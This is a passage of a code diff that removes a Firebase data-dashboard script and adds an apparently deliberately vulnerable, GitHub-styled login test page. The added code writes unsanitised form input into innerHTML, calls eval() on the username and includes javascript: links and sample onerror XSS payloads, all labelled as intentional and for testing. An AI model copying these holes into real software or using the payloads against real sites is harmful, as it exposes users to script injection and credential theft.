-            appId: "1:768133753576:web:41043b3e0add33d96b775d",
-            measurementId: "G-0BHXWR9J05"
-        };
-        
-        // Initialize Firebase
-        firebase.initializeApp(firebaseConfig);
-        const auth = firebase.auth();
-        const db = firebase.firestore();
-        
-        // Global variables
-        let currentUser = null;
-        let userData = [];
-        let allData = [];
-        let filteredData = [];
-        let categories = new Set();
-        let charts = {};
-        
-        // DOM Elements
-        const loadingSpinner = document.getElementById('loadingSpinner');
-        const authContainer = document.getElementById('authContainer');
-        const userInfo = document.getElementById('userInfo');
-        const userName = document.getElementById('userName');
-        const logoutBtn = document.getElementById('logoutBtn');
-        
-        // Show loading spinner
-        function showLoading() {
-            loadingSpinner.style.display = 'flex';
+    <!-- XSS VECTOR 4: Reflected output - dangerously sets HTML -->
+    <div id="xssOutput" class="mt-4 p-3 bg-gray-50 border border-gray-200 rounded-md text-xs font-mono xss-output">
+      <!-- XSS payload will be injected here via innerHTML -->
+      XSS output will appear here
+    </div>
+  </div>
+
+  <!-- "Create account" - also has XSS vector via onclick -->
+  <div class="w-full max-w-[340px] mt-4 p-4 bg-white border border-[#d0d7de] rounded-md text-center text-[14px]">
+    <span class="text-[#1f2328]">New to GitHub? </span>
+    <a href="#" onclick="createAccountXSS()" class="text-[#0969da] no-underline hover:underline font-medium">
+      Create an account
+    </a>
+    <span class="ml-1 text-xs text-red-600">(XSS vector)</span>
+  </div>
+
+  <!-- Footer links - some with javascript: XSS vectors -->
+  <div class="flex flex-wrap items-center justify-center gap-x-4 gap-y-1 mt-8 text-[12px]">
+    <a href="javascript:alert('Terms XSS')" class="hover:underline text-[#6e7781] no-underline">Terms</a>
+    <a href="javascript:alert('Privacy XSS')" class="hover:underline text-[#6e7781] no-underline">Privacy</a>
+    <a href="#" onclick="docsXSS()" class="hover:underline text-[#6e7781] no-underline">Docs</a>
+    <a href="#" onclick="contactXSS()" class="hover:underline text-[#6e7781] no-underline flex items-center gap-1">
+      Contact Support (XSS)
+    </a>
+  </div>
+
+  <!-- XSS EXPLOITATION DEMONSTRATION -->
+  <div class="w-full max-w-[340px] mt-6 p-4 bg-red-50 border border-red-200 rounded-md">
+    <h3 class="font-bold text-red-800 text-sm mb-2">🔥 XSS PAYLOAD TESTING 🔥</h3>
+    <div class="grid grid-cols-2 gap-2 text-xs">
+      <button onclick="testXSS1()" class="bg-red-100 p-2 rounded border border-red-300 hover:bg-red-200">Test alert(1)</button>
+      <button onclick="testXSS2()" class="bg-red-100 p-2 rounded border border-red-300 hover:bg-red-200">Test &lt;img&gt;</button>
+      <button onclick="testXSS3()" class="bg-red-100 p-2 rounded border border-red-300 hover:bg-red-200">Test &lt;script&gt;</button>
+      <button onclick="testXSS4()" class="bg-red-100 p-2 rounded border border-red-300 hover:bg-red-200">Test onerror</button>
+    </div>
+    <p class="text-xs text-red-700 mt-2">Enter in username field: <code class="bg-red-100 px-1">&lt;img src=x onerror=alert('XSS')&gt;</code></p>
+  </div>
+
+  <!-- DELIBERATE XSS VULNERABILITIES - JavaScript with unsafe patterns -->
+  <script>
+    // ============== INTENTIONAL XSS VULNERABILITIES ==============
+    // DO NOT USE THIS CODE IN PRODUCTION - FOR SECURITY TESTING ONLY
+    
+    // VULNERABILITY 1: innerHTML injection from form input
+    function vulnLogin() {
+      // Get user input without sanitization
+      var username = document.getElementById('login_field').value;
+      var password = document.getElementById('password_field').value;
+      
+      // DANGER: Direct innerHTML injection - XSS vulnerability
+      var outputDiv = document.getElementById('xssOutput');
+      outputDiv.innerHTML = '<strong>Login attempt:</strong> ' + username + ' / ' + password;
+      
+      // Also demonstrate eval vulnerability if input contains "eval"
+      if (username.includes('eval(') || password.includes('eval(')) {
+        try {
+          // DANGER: Dynamic eval - severe XSS vector
+          eval(username); // NEVER DO THIS
+        } catch(e) {
+          console.log('Eval attempted');
         }
-        
-        // Hide loading spinner
-        function hideLoading() {
-            loadingSpinner.style.display = 'none';
-        }
-        
-        // Show notification
-        function showNotification(message, type = 'info') {
-            const notification = document.createElement('div');
-            notification.className = `notification notification-${type}`;
-            notification.textContent = message;
-            document.body.appendChild(notification);
-            
-            setTimeout(() => {
-                notification.classList.add('show');
-            }, 10);
-            
-            setTimeout(() => {
-                notification.classList.remove('show');
-                setTimeout(() => {
-                    notification.remove();
-                }, 300);
-            }, 3000);
-        }
-        
-        // Authentication Functions
-        function showAuthModal() {
-            authContainer.style.display = 'flex';
-        }
-        
-        function hideAuthModal() {
-            authContainer.style.display = 'none';
-        }
-        
-        // Tab switching for auth
-        document.querySelectorAll('.auth-tab').forEach(tab => {
-            tab.addEventListener('click', function() {
-                const tabName = this.getAttribute('data-tab');
-                
-                document.querySelectorAll('.auth-tab').forEach(t => t.classList.remove('active'));
-                this.classList.add('active');
-                
-                document.querySelectorAll('.auth-content').forEach(content => {
-                    content.classList.remove('active');
-                });
-                
-                document.getElementById(`${tabName}Content`).classList.add('active');
-            });
-        });
-        
-        // Login function
-        document.getElementById('loginBtn').addEventListener('click', async function() {
-            const email = document.getElementById('loginEmail').value;
-            const password = document.getElementById('loginPassword').value;
-            
-            if (!email || !password) {
-                showNotification('Please enter email and password', 'error');
-                return;
-            }
-            
-            showLoading();
-            try {
-                const userCredential = await auth.signInWithEmailAndPassword(email, password);
-                currentUser = userCredential.user;
-                showNotification('Login successful!', 'success');
-                hideAuthModal();
-                loadUserData();
-            } catch (error) {
-                showNotification(error.message, 'error');
-            } finally {
-                hideLoading();
-            }
-        });
-        
-        // Register function
-        document.getElementById('registerBtn').addEventListener('click', async function() {
-            const name = document.getElementById('registerName').value;
-            const email = document.getElementById('registerEmail').value;
-            const password = document.getElementById('registerPassword').value;
-            
-            if (!name || !email || !password) {
-                showNotification('Please fill all fields', 'error');
-                return;
-            }
-            
-            if (password.length < 6) {
-                showNotification('Password must be at least 6 characters', 'error');
-                return;
-            }
-            
-            showLoading();
-            try {
-                const userCredential = await auth.createUserWithEmailAndPassword(email, password);
-                currentUser = userCredential.user;
-                
-                // Store user profile
-                await db.collection('users').doc(currentUser.uid).set({
-                    name: name,
-                    email: email,
-                    createdAt: new Date().toISOString()
-                });
-                
-                showNotification('Registration successful!', 'success');
-                hideAuthModal();
-                loadUserData();
-            } catch (error) {
-                showNotification(error.message, 'error');
-            } finally {
-                hideLoading();
-            }
-        });
-        
-        // Logout function
-        logoutBtn.addEventListener('click', async function() {
-            showLoading();
-            try {
-                await auth.signOut();
-                currentUser = null;
-                userData = [];
-                showNotification('Logged out successfully', 'info');
-                updateUI();
-            } catch (error) {
-                showNotification(error.message, 'error');
-            } finally {
-                hideLoading();
-            }
-        });
-        
-        // Auth state observer
-        auth.onAuthStateChanged((user) => {
-            if (user) {
-                currentUser = user;
-                loadUserData();
-            } else {
-                currentUser = null;
-                userData = [];
-                updateUI();
-                showAuthModal();
-            }
-        });
-        
-        // Load user data from Firebase
-        async function loadUserData() {
-            if (!currentUser) return;
-            
-            showLoading();
-            try {
-                // Load user profile
-                const userDoc = await db.collection('users').doc(currentUser.uid).get();
-                if (userDoc.exists) {
-                    const userProfile = userDoc.data();
-                    userName.textContent = userProfile.name;
-                }
-                
-                // Load user's data entries
-                const snapshot = await db.collection('entries')
-                    .where('userId', '==', currentUser.uid)
-                    .orderBy('createdAt', 'desc')
-                    .get();
-                
-                userData = [];
-                snapshot.forEach(doc => {
-                    userData.push({ id: doc.id, ...doc.data() });
-                });
-                
-                showNotification(`Loaded ${userData.length} entries`, 'success');
-                updateUI();
-            } catch (error) {
-                showNotification('Error loading data: ' + error.message, 'error');
-                // Fallback to localStorage
-                const localData = localStorage.getItem(`userData_${currentUser.uid}`);
-                if (localData) {
-                    userData = JSON.parse(localData);
-                    showNotification('Loaded from local backup', 'warning');
-                }
-            } finally {
-                hideLoading();
-            }
-        }
-        
-        // Save entry to Firebase
-        async function saveEntry(entry) {
-            if (!currentUser) {
-                showNotification('Please login to save data', 'error');
-                return null;
-            }
-            
-            try {
-                const entryWithUser = {
-                    ...entry,
-                    userId: currentUser.uid,
-                    createdAt: new Date().toISOString(),
-                    updatedAt: new Date().toISOString()
-                };
-                
-                const docRef = await db.collection('entries').add(entryWithUser);
-                entry.id = docRef.id;
-                
-                // Also save locally as backup
-                localStorage.setItem(`userData_${currentUser.uid}`, JSON.stringify(userData));
-                
-                return entry;
-            } catch (error) {
-                showNotification('Error saving to cloud: ' + error.message, 'error');
-                // Fallback to localStorage
-                entry.id = Date.now().toString();
-                userData.push(entry);
-                localStorage.setItem(`userData_${currentUser.uid}`, JSON.stringify(userData));
-                return entry;
-            }
-        }
-        
-        // Update UI based on auth state
-        function updateUI() {
-            if (currentUser) {
-                userInfo.style.display = 'block';
-                document.getElementById('syncStatus').textContent = 'Online';
-            } else {
-                userInfo.style.display = 'none';
-                document.getElementById('syncStatus').textContent = 'Offline';
-            }
-            
-            // Update data display
-            allData = [...userData];
-            filteredData = [...userData];
-            updateCategories();
-            updateTable();
-            updateStats();
-            updateCharts();
-            updateRecentEntries();
-        }
-        
-        // Initialize application
-        document.addEventListener('DOMContentLoaded', function() {
-            // Set today's date as default
-            const today = new Date().toISOString().split('T')[0];
-            document.getElementById('entryDate').value = today;
-            document.getElementById('filterDateTo').value = today;
-            
-            // Initialize categories
-            updateCategories();
-            
-            // Navigation tabs
-            document.querySelectorAll('.nav-tab').forEach(tab => {
-                tab.addEventListener('click', function() {
-                    const tabId = this.getAttribute('data-tab');
-                    
-                    document.querySelectorAll('.nav-tab').forEach(t => t.classList.remove('active'));
-                    this.classList.add('active');
-                    
-                    document.querySelectorAll('.tab-content').forEach(content => {
-                        content.classList.remove('active');
-                    });
-                    
-                    document.getElementById(`${tabId}Tab`).classList.add('active');
-                });
-            });
-            
-            // Data form submission
-            document.getElementById('dataForm').addEventListener('submit', async function(e) {
-                e.preventDefault();
-                
-                const entry = {
-                    name: document.getElementById('entryName').value.trim(),
-                    category: document.getElementById('entryCategory').value.trim() || 'Uncategorized',
-                    value: parseFloat(document.getElementById('entryValue').value) || 0,
-                    date: document.getElementById('entryDate').value,
-                    status: document.getElementById('entryStatus').value,
-                    notes: document.getElementById('entryNotes').value.trim(),
-                    timestamp: new Date().toISOString()
-                };
-                
-                if (!entry.name) {
-                    showNotification('Please enter a name for the entry', 'error');
-                    return;
-                }
-                
-                showLoading();
-                try {
-                    const savedEntry = await saveEntry(entry);
-                    if (savedEntry) {
-                        userData.unshift(savedEntry);
-                        updateUI();
-                        showNotification(`Entry "${entry.name}" added successfully!`, 'success');
-                        
-                        // Reset form
-                        this.reset();
-                        document.getElementById('entryDate').value = today;
-                    }
-                } catch (error) {
-                    showNotification('Error saving entry: ' + error.message, 'error');
-                } finally {
-                    hideLoading();
-                }
-            });
-            
-            // Reset form button
-            document.getElementById('resetFormBtn').addEventListener('click', function() {
-                document.getElementById('dataForm').reset();
-                document.getElementById('entryDate').value = today;
-                showNotification('Form has been reset', 'info');
-            });
-            
-            // Add category button
-            document.getElementById('addCategoryBtn').addEventListener('click', function() {
-                const categoryInput = document.getElementById('entryCategory');
-                const category = categoryInput.value.trim();
-                
-                if (category && !categories.has(category)) {
-                    categories.add(category);
-                    updateCategories();
-                    showNotification(`Category "${category}" added`, 'info');
-                }
-            });
-            
-            // Apply filters
-            document.getElementById('applyFilters').addEventListener('click', applyFilters);
-            document.getElementById('clearFilters').addEventListener('click', clearFilters);
-            
-            // Export buttons
-            document.getElementById('downloadBtn').addEventListener('click', showExportModal);
-            document.getElementById('quickCSVBtn').addEventListener('click', () => exportData('csv'));
-            document.getElementById('quickExcelBtn').addEventListener('click', () => exportData('excel'));
-            document.getElementById('exportJSONBtn').addEventListener('click', () => exportData('json'));
-            document.getElementById('exportPDFBtn').addEventListener('click', () => exportData('pdf'));
-            
-            // CSV Import
-            const csvFileInput = document.getElementById('csvFileInput');
-            csvFileInput.addEventListener('change', handleCSVImport);
-            document.getElementById('importBtn').addEventListener('click', processCSVImport);
-            
-            // Initialize Charts
-            initializeCharts();
-        });
-        
-        // Update categories list
-        function updateCategories() {
-            categories.clear();
-            userData.forEach(item => {
-                if (item.category) {
-                    categories.add(item.category);
-                }
-            });
-            
-            // Update category dropdowns
-            const categorySelect = document.getElementById('filterCategory');
-            const categoryList = document.getElementById('categoryList');
-            
-            categorySelect.innerHTML = '<option value="">All Categories</option>';
-            categoryList.innerHTML = '';
-            
-            categories.forEach(category => {
-                const option = document.createElement('option');
-                option.value = category;
-                categorySelect.appendChild(option.cloneNode(true));
-                categoryList.appendChild(option);
-            });
-        }
-        
-        // Apply advanced filters
-        function applyFilters() {
-            const categoryFilter = document.getElementById('filterCategory').value;
-            const statusFilter = document.getElementById('filterStatus').value;
-            const dateFrom = document.getElementById('filterDateFrom').value;
-            const dateTo = document.getElementById('filterDateTo').value;
-            const minValue = parseFloat(document.getElementById('filterMinValue').value) || 0;
-            const maxValue = parseFloat(document.getElementById('filterMaxValue').value) || Infinity;
-            const searchText = document.getElementById('filterSearch').value.toLowerCase();
-            
-            filteredData = userData.filter(item => {
-                // Category filter
-                if (categoryFilter && item.category !== categoryFilter) return false;
-                
-                // Status filter
-                if (statusFilter && item.status !== statusFilter) return false;
-                
-                // Date range filter
-                if (dateFrom && item.date < dateFrom) return false;
-                if (dateTo && item.date > dateTo) return false;
-                
-                // Value range filter
-                if (item.value < minValue || item.value > maxValue) return false;
-                
-                // Search filter
-                if (searchText && !item.name.toLowerCase().includes(searchText)) return false;
-                
-                return true;
-            });
-            
-            document.getElementById('filterCount').textContent = filteredData.length;
-            updateTable();
-        }
-        
-        // Clear filters
-        function clearFilters() {
-            document.getElementById('filterCategory').value = '';
-            document.getElementById('filterStatus').value = '';
-            document.getElementById('filterDateFrom').value = '';
-            document.getElementById('filterDateTo').value = '';
-            document.getElementById('filterMinValue').value = '';
-            document.getElementById('filterMaxValue').value = '';
-            document.getElementById('filterSearch').value = '';
-            
-            filteredData = [...userData];
-            document.getElementById('filterCount').textContent = filteredData.length;
-            updateTable();
-        }
-        
-        // Update table display
-        function updateTable() {
-            const tableBody = document.getElementById('tableBody');
-            tableBody.innerHTML = '';
-            
-            if (filteredData.length === 0) {
-                tableBody.innerHTML = `
-                    <tr class="empty-row">
-                        <td colspan="6" class="empty-message">No data found matching your filters</td>
-                    </tr>
-                `;
-                return;
-            }
-            
-            filteredData.forEach(item => {
-                const row = document.createElement('tr');
-                
-                const formattedValue = new Intl.NumberFormat('en-US', {
-                    style: 'currency',
-                    currency: 'USD'
-                }).format(item.value);
-                
-                const formattedDate = item.date ? new Date(item.date).toLocaleDateString('en-US', {
-                    year: 'numeric',
-                    month: 'short',
-                    day: 'numeric'
-                }) : 'N/A';
-                
-                let statusClass = '';
-                switch(item.status) {
-                    case 'Active': statusClass = 'status-active'; break;
-                    case 'Pending': statusClass = 'status-pending'; break;
-                    case 'Completed': statusClass = 'status-completed'; break;
-                    case 'Cancelled': statusClass = 'status-cancelled'; break;
-                }
-                
-                row.innerHTML = `
-                    <td>${item.name}</td>
-                    <td><span class="category-display">${item.category}</span></td>
-                    <td>${formattedValue}</td>
-                    <td>${formattedDate}</td>
-                    <td><span class="status ${statusClass}">${item.status}</span></td>
-                    <td>
-                        <button class="btn btn-sm btn-danger delete-btn" data-id="${item.id}" title="Delete">
-                            <i class="fas fa-trash"></i>
-                        </button>
-                    </td>
-                `;
-                
-                tableBody.appendChild(row);
-            });
-            
-            // Add delete button listeners
-            document.querySelectorAll('.delete-btn').forEach(btn => {
-                btn.addEventListener('click', async function() {
-                    const id = this.getAttribute('data-id');
-                    if (confirm('Are you sure you want to delete this entry?')) {
-                        showLoading();
-                        try {
-                            // Delete from Firebase
-                            await db.collection('entries').doc(id).delete();
-                            
-                            // Delete from local arrays
-                            userData = userData.filter(item => item.id !== id);
-                            filteredData = filteredData.filter(item => item.id !== id);
-                            
-                            // Update backup
-                            localStorage.setItem(`userData_${currentUser.uid}`, JSON.stringify(userData));
-                            
-                            updateUI();
-                            showNotification('Entry deleted successfully', 'success');
-                        } catch (error) {
-                            showNotification('Error deleting entry: ' + error.message, 'error');
-                        } finally {
-                            hideLoading();
-                        }
-                    }
-                });
-            });
-        }
-        
-        // Update statistics
-        function updateStats() {
-            const totalEntries = userData.length;
-            const totalValue = userData.reduce((sum, item) => sum + item.value, 0);
-            const avgValue = totalEntries > 0 ? totalValue / totalEntries : 0;
-            const activeEntries = userData.filter(item => item.status === 'Active').length;
-            
-            document.getElementById('totalEntries').textContent = totalEntries;
-            document.getElementById('totalValue').textContent = new Intl.NumberFormat('en-US', {
-                style: 'currency',
-                currency: 'USD'
-            }).format(totalValue);
-            
-            document.getElementById('activeEntries').textContent = activeEntries;
-            document.getElementById('categoriesCount').textContent = categories.size;
-            document.getElementById('dataCount').textContent = `${totalEntries} entries`;
-            document.getElementById('avgValue').textContent = new Intl.NumberFormat('en-US', {
-                style: 'currency',
-                currency: 'USD'
-            }).format(avgValue);
-            
-            // Calculate trends (simple example)
-            const lastWeekEntries = userData.filter(item => {
-                const oneWeekAgo = new Date();
-                oneWeekAgo.setDate(oneWeekAgo.getDate() - 7);
-                return new Date(item.date) > oneWeekAgo;
-            }).length;
-            
-            const lastWeekValue = userData.filter(item => {
-                const oneWeekAgo = new Date();
-                oneWeekAgo.setDate(oneWeekAgo.getDate() - 7);
-                return new Date(item.date) > oneWeekAgo;
-            }).reduce((sum, item) => sum + item.value, 0);
-            
-            document.getElementById('entriesTrend').textContent = `+${lastWeekEntries} this week`;
-            document.getElementById('valueTrend').textContent = `+${new Intl.NumberFormat('en-US', {
-                style: 'currency',
-                currency: 'USD'
-            }).format(lastWeekValue)} this week`;
-        }
-        
-        // Update recent entries
-        function updateRecentEntries() {
-            const recentTableBody = document.getElementById('recentTableBody');
-            recentTableBody.innerHTML = '';
-            
-            const recentData = userData.slice(0, 5);
-            
-            if (recentData.length === 0) {
-                recentTableBody.innerHTML = `
-                    <tr>
-                        <td colspan="5" class="empty-message">No recent entries</td>
-                    </tr>
-                `;
-                return;
-            }
-            
-            recentData.forEach(item => {
-                const row = document.createElement('tr');
-                
-                const formattedValue = new Intl.NumberFormat('en-US', {
-                    style: 'currency',
-                    currency: 'USD'
-                }).format(item.value);
-                
-                const formattedDate = item.date ? new Date(item.date).toLocaleDateString('en-US', {
-                    year: 'numeric',
-                    month: 'short',
-                    day: 'numeric'
-                }) : 'N/A';
-                
-                row.innerHTML = `
-                    <td>${item.name}</td>
-                    <td>${item.category}</td>
-                    <td>${formattedValue}</td>
-                    <td>${formattedDate}</td>
-                    <td>${item.status}</td>
-                `;
-                
-                recentTableBody.appendChild(row);
-            });
-        }
-        
-        // Initialize charts
-        function initializeCharts() {
-            // Category Distribution Chart
-            const categoryCtx = document.getElementById('categoryChart').getContext('2d');
-            charts.category = new Chart(categoryCtx, {
-                type: 'pie',
-                data: {
-                    labels: [],
-                    datasets: [{
-                        data: [],
-                        backgroundColor: [
-                            '#4a6491', '#27ae60', '#f39c12', '#e74c3c', '#9b59b6',
-                            '#3498db', '#1abc9c', '#d35400', '#c0392b', '#7f8c8d'
-                        ]
-                    }]
-                },
-                options: {
-                    responsive: true,
-                    maintainAspectRatio: false,
-                    plugins: {
-                        legend: {
-                            position: 'bottom'
-                        }
-                    }
-                }
-            });
-            
-            // Monthly Trend Chart
-            const monthlyCtx = document.getElementById('monthlyChart').getContext('2d');
-            charts.monthly = new Chart(monthlyCtx, {
-                type: 'line',
-                data: {
-                    labels: [],
-                    datasets: [{
-                        label: 'Entries',
-                        data: [],
-                        borderColor: '#4a6491',
-                        backgroundColor: 'rgba(74, 100, 145, 0.1)',
-                        fill: true,
-                        tension: 0.4
-                    }]
-                },
-                options: {
-                    responsive: true,
-                    maintainAspectRatio: false,
-                    scales: {
-                        y: {
-                            beginAtZero: true
-                        }
-                    }
-                }
-            });
-            
-            // Status Overview Chart
-            const statusCtx = document.getElementById('statusChart').getContext('2d');
-            charts.status = new Chart(statusCtx, {
-                type: 'doughnut',
-                data: {
-                    labels: [],
-                    datasets: [{
-                        data: [],
-                        backgroundColor: [
-                            '#27ae60', // Active
-                            '#f39c12', // Pending
-                            '#3498db', // Completed
-                            '#e74c3c'  // Cancelled
-                        ]
-                    }]
-                },
-                options: {
-                    responsive: true,
-                    maintainAspectRatio: false,
-                    plugins: {
-                        legend: {
-                            position: 'bottom'
-                        }
-                    }
-                }
-            });
-            
-            // Value Distribution Chart
-            const valueCtx = document.getElementById('valueChart').getContext('2d');
-            charts.value = new Chart(valueCtx, {
-                type: 'bar',
-                data: {
-                    labels: [],
-                    datasets: [{
-                        label: 'Value Range',
-                        data: [],
-                        backgroundColor: '#4a6491'
-                    }]
-                },
-                options: {
-                    responsive: true,
-                    maintainAspectRatio: false,
-                    scales: {
-                        y: {
-                            beginAtZero: true
-                        }
-                    }
-                }
-            });
-        }
-        
-        // Update all charts
-        function updateCharts() {
-            if (userData.length === 0) return;
-            
-            // Category Distribution
-            const categoryCounts = {};
-            userData.forEach(item => {
-                categoryCounts[item.category] = (categoryCounts[item.category] || 0) + 1;
-            });
-            
-            charts.category.data.labels = Object.keys(categoryCounts);
-            charts.category.data.datasets[0].data = Object.values(categoryCounts);
-            charts.category.update();
-            
-            // Monthly Trend (last 6 months)
-            const months = [];
-            const monthCounts = {};
-            const now = new Date();
-            
-            for (let i = 5; i >= 0; i--) {
-                const date = new Date(now.getFullYear(), now.getMonth() - i, 1);
-                const monthKey = date.toLocaleString('default', { month: 'short' });
-                months.push(monthKey);
-                monthCounts[monthKey] = 0;
-            }
-            
-            userData.forEach(item => {
-                const itemDate = new Date(item.date);
-                const monthKey = itemDate.toLocaleString('default', { month: 'short' });
-                if (months.includes(monthKey)) {
-                    monthCounts[monthKey]++;
-                }
-            });
-            
-            charts.monthly.data.labels = months;
-            charts.monthly.data.datasets[0].data = months.map(month => monthCounts[month]);
-            charts.monthly.update();
-            
-            // Status Overview
-            const statusCounts = {
-                'Active': 0,
-                'Pending': 0,
-                'Completed': 0,
-                'Cancelled': 0
-            };
-            
-            userData.forEach(item => {
-                if (statusCounts.hasOwnProperty(item.status)) {
-                    statusCounts[item.status]++;
-                }
-            });
-            
-            charts.status.data.labels = Object.keys(statusCounts);
-            charts.status.data.datasets[0].data = Object.values(statusCounts);
-            charts.status.update();
-            
-            // Value Range Distribution
-            const valueRanges = ['0-100', '101-500', '501-1000', '1001-5000', '5000+'];
-            const valueCounts = [0, 0, 0, 0, 0];
-            
-            userData.forEach(item => {
-                if (item.value <= 100) valueCounts[0]++;
-                else if (item.value <= 500) valueCounts[1]++;
-                else if (item.value <= 1000) valueCounts[2]++;
-                else if (item.value <= 5000) valueCounts[3]++;
-                else valueCounts[4]++;
-            });
-            
-            charts.value.data.labels = valueRanges;
-            charts.value.data.datasets[0].data = valueCounts;
-            charts.value.update();
-        }
-        
-        // CSV Import handling
-        function handleCSVImport(event) {
-            const file = event.target.files[0];
-            if (!file) return;
-            
-            document.getElementById('selectedFileName').textContent = `Selected: ${file.name}`;
-            document.getElementById('importBtn').disabled = false;
-            
-            const reader = new FileReader();
-            reader.onload = function(e) {
-                const csvContent = e.target.result;
-                previewCSVData(csvContent);
-            };
-            reader.readAsText(file);
-        }
-        
-        function previewCSVData(csvContent) {
-            const rows = csvContent.split('\n');
-            const previewTableBody = document.getElementById('previewTableBody');
-            previewTableBody.innerHTML = '';
-            
-            let validRows = 0;
-            let invalidRows = 0;
-            
-            // Parse first 5 rows for preview
-            for (let i = 1; i < Math.min(6, rows.length); i++) {
-                if (!rows[i].trim()) continue;
-                
-                const cells = rows[i].split(',').map(cell => cell.trim().replace(/^"|"$/g, ''));
-                
-                if (cells.length >= 4) {
-                    const row = document.createElement('tr');
-                    row.innerHTML = `
-                        <td>${cells[0] || ''}</td>
-                        <td>${cells[1] || ''}</td>
-                        <td>${cells[2] || ''}</td>
-                        <td>${cells[3] || ''}</td>
-                        <td>${cells[4] || 'Active'}</td>
-                    `;
-                    previewTableBody.appendChild(row);
-                    validRows++;
-                } else {
-                    invalidRows++;
-                }
-            }
-            
-            document.getElementById('importRowCount').textContent = rows.length - 1;
-            document.getElementById('importValidRows').textContent = validRows;
-            document.getElementById('importInvalidRows').textContent = invalidRows;
-        }
-        
-        async function processCSVImport() {
-            const fileInput = document.getElementById('csvFileInput');
-            if (!fileInput.files[0]) {
-                showNotification('Please select a CSV file first', 'error');
-                return;
-            }
-            
-            const strategy = document.getElementById('importStrategy').value;
-            const file = fileInput.files[0];
-            
-            showLoading();
-            
-            try {
-                const csvContent = await readFileAsText(file);
-                const rows = csvContent.split('\n');
-                const importedData = [];
-                
-                for (let i = 1; i < rows.length; i++) {
-                    if (!rows[i].trim()) continue;
-                    
-                    const cells = rows[i].split(',').map(cell => cell.trim().replace(/^"|"$/g, ''));
-                    
-                    if (cells.length >= 4) {
-                        const entry = {
-                            name: cells[0] || `Imported Entry ${i}`,
-                            category: cells[1] || 'Imported',
-                            value: parseFloat(cells[2]) || 0,
-                            date: cells[3] || new Date().toISOString().split('T')[0],
-                            status: cells[4] || 'Active',
-                            notes: `Imported from CSV on ${new Date().toLocaleString()}`,
-                            timestamp: new Date().toISOString()
-                        };
-                        
-                        importedData.push(entry);
-                    }
-                }
-                
-                if (strategy === 'replace') {
-                    userData = [];
-                } else if (strategy === 'merge') {
-                    // Keep existing, add new
-                }
-                
-                // Save imported data
-                for (const entry of importedData) {
-                    const savedEntry = await saveEntry(entry);
-                    if (savedEntry) {
-                        userData.push(savedEntry);
-                    }
-                }
-                
-                updateUI();
-                showNotification(`Successfully imported ${importedData.length} entries`, 'success');
-                
-                // Reset import form
-                fileInput.value = '';
-                document.getElementById('selectedFileName').textContent = '';
-                document.getElementById('importBtn').disabled = true;
-                document.getElementById('previewTableBody').innerHTML = `
-                    <tr>
-                        <td colspan="5" class="empty-message">No file selected</td>
-                    </tr>
-                `;
-                
-            } catch (error) {
-                showNotification('Error importing CSV: ' + error.message, 'error');
-            } finally {
-                hideLoading();
-            }
-        }
-        
-        function readFileAsText(file) {
-            return new Promise((resolve, reject) => {
-                const reader = new FileReader();
-                reader.onload = (e) => resolve(e.target.result);
-                reader.onerror = (e) => reject(e);
-                reader.readAsText(file);
-            });
-        }
-        
-        // Export functions
-        function showExportModal() {
-            // Simple export modal implementation
-            if (userData.length === 0) {
-                showNotification('No data to export', 'warning');
-                return;
-            }
-            
-            exportData('csv'); // Default to CSV
-        }
-        
-        function exportData(format) {
-            if (userData.length === 0) {
-                showNotification('No data to export', 'warning');
-                return;
-            }
-            
-            const timestamp = new Date().toISOString().slice(0, 19).replace(/[:]/g, '-');
-            const filename = `data-export-${timestamp}`;
-            
-            switch(format) {
-                case 'csv':
-                    exportCSV(filename);
-                    break;
-                case 'excel':
-                    exportExcel(filename);
-                    break;
-                case 'json':
-                    exportJSON(filename);
-                    break;
-                case 'pdf':
-                    exportPDF(filename);
-                    break;
-            }
-            
-            showNotification(`Data exported as ${format.toUpperCase()} successfully!`, 'success');
-        }
-        
-        function exportCSV(filename) {
-            let csv = 'Name,Category,Value,Date,Status,Notes\n';
-            
-            userData.forEach(item => {
-                const formattedDate = item.date ? new Date(item.date).toLocaleDateString('en-US') : '';
-                csv += `"${item.name}","${item.category}",${item.value},"${formattedDate}","${item.status}","${item.notes || ''}"\n`;
-            });
-            
-            downloadFile(csv, `${filename}.csv`, 'text/csv');
-        }
-        
-        function exportExcel(filename) {
-            let html = `
-                <html xmlns:o="urn:schemas-microsoft-com:office:office" 
-                      xmlns:x="urn:schemas-microsoft-com:office:excel" 
-                      xmlns="http://www.w3.org/TR/REC-html40">
-                <head>
-                    <meta charset="UTF-8">
-                    <style>
-                        table { border-collapse: collapse; width: 100%; }
-                        th { background-color: #4a6491; color: white; padding: 10px; text-align: left; }
-                        td { border: 1px solid #ddd; padding: 8px; }
-                    </style>
-                </head>
-                <body>
-                <h1>Data Export - ${new Date().toLocaleString()}</h1>
-                <table>
-                    <tr>
-                        <th>Name</th>
-                        <th>Category</th>
-                        <th>Value</th>
-                        <th>Date</th>
-                        <th>Status</th>
-                        <th>Notes</th>
-                    </tr>
-            `;
-            
-            userData.forEach(item => {
-                const formattedDate = item.date ? new Date(item.date).toLocaleDateString('en-US') : '';
-                const formattedValue = new Intl.NumberFormat('en-US', {
-                    style: 'currency',
-                    currency: 'USD'
-                }).format(item.value);
-                
-                html += `
-                    <tr>
-                        <td>${item.name}</td>
-                        <td>${item.category}</td>
-                        <td>${formattedValue}</td>
-                        <td>${formattedDate}</td>
-                        <td>${item.status}</td>
-                        <td>${item.notes || ''}</td>
-                    </tr>
-                `;
-            });
-            
-            html += `
-                </table>
-                <p>Total Entries: ${userData.length}</p>
-                </body></html>
-            `;
-            
-            downloadFile(html, `${filename}.xls`, 'application/vnd.ms-excel');
-        }
-        
-        function exportJSON(filename) {
-            const exportData = {
-                exportDate: new Date().toISOString(),
-                totalEntries: userData.length,
-                totalValue: userData.reduce((sum, item) => sum + item.value, 0),
-                data: userData
-            };
-            
-            const jsonString = JSON.stringify(exportData, null, 2);
-            downloadFile(jsonString, `${filename}.json`, 'application/json');
-        }
-        
-        function exportPDF(filename) {
-            // Create printable HTML for PDF
-            let html = `
-                <html>
-                <head>
-                    <title>Data Export</title>
-                    <style>
-                        body { font-family: Arial, sans-serif; margin: 20px; }
-                        h1 { color: #2c3e50; }
-                        table { border-collapse: collapse; width: 100%; margin-top: 20px; }
-                        th { background-color: #4a6491; color: white; padding: 10px; text-align: left; }
-                        td { border: 1px solid #ddd; padding: 8px; }
-                    </style>
-                </head>
-                <body>
-                <h1>Data Export</h1>
-                <p>Export Date: ${new Date().toLocaleString()}</p>
-                <table>
-                    <tr>
-                        <th>Name</th>
-                        <th>Category</th>
-                        <th>Value</th>
-                        <th>Date</th>
-                        <th>Status</th>
